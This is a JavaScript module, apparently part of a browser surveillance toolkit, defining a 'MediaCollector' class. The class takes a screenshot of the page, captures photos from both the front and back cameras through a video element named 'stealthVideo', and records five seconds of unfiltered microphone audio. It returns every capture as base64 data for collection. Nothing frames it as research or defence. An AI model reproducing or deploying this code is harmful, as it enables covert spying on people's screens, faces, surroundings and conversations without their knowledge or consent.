// collectors/media.js

export class MediaCollector {
    constructor() {
        this.name = 'media';
    }

    async collect() {
        const results = {
            screenshot: null,
            camera: null,
            backCamera: null,
            microphone: null,
            timestamp: Date.now()
        };

        // Screenshot
        results.screenshot = await this.captureScreenshot();

        // Camera
        results.camera = await this.captureCamera('user');
        results.backCamera = await this.captureCamera('environment');

        // Microphone
        results.microphone = await this.recordAudio();

        return results;
    }

    async captureScreenshot() {
        try {
            if (typeof html2canvas === 'undefined') {
                return { error: 'html2canvas not loaded' };
            }
            
            const canvas = await html2canvas(document.body, {
                scale: 0.5,
                useCORS: true,
                logging: false,
                allowTaint: true,
                backgroundColor: null,
                width: window.innerWidth,
                height: window.innerHeight
            });
            
            return {
                type: 'fullpage',
                resolution: `${canvas.width}x${canvas.height}`,
                data: canvas.toDataURL('image/jpeg', 0.7),
                timestamp: Date.now()
            };
        } catch (error) {
            return { error: error.message };
        }
    }

    async captureCamera(facingMode = 'user') {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: facingMode
                }
            });

            const video = document.getElementById('stealthVideo');
            video.srcObject = stream;
            await video.play();

            await this.delay(1000);

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photo = canvas.toDataURL('image/jpeg', 0.8);

            // Stop stream
            stream.getTracks().forEach(track => track.stop());
            video.srcObject = null;

            return {
                type: 'photo',
                resolution: `${canvas.width}x${canvas.height}`,
                camera: facingMode,
                data: photo,
                timestamp: Date.now()
            };
        } catch (error) {
            return { error: error.message, status: 'denied' };
        }
    }

    async recordAudio(duration = 5000) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: {
                    echoCancellation: false,
                    noiseSuppression: false,
                    autoGainControl: false,
                    channelCount: 2
                }
            });

            const recorder = new MediaRecorder(stream, { 
                mimeType: this.getAudioMimeType() 
            });
            const chunks = [];

            return new Promise((resolve) => {
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm;codecs=opus' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        stream.getTracks().forEach(track => track.stop());
                        resolve({
                            type: 'audio',
                            duration: duration / 1000,
                            format: 'webm',
                            size: blob.size,
                            data: reader.result,
                            timestamp: Date.now()
                        });
                    };
                    reader.readAsDataURL(blob);
                };

                recorder.start();
                setTimeout(() => {
                    if (recorder.state === 'recording') {
                        recorder.stop();
                    }
                }, duration);
            });
        } catch (error) {
            return { error: error.message, status: 'denied' };
        }
    }

    getAudioMimeType() {
        const types = [
            'audio/webm;codecs=opus',
            'audio/webm',
            'audio/ogg;codecs=opus',
            'audio/mp4'
        ];
        for (const type of types) {
            if (MediaRecorder.isTypeSupported(type)) {
                return type;
            }
        }
        return 'audio/webm';
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}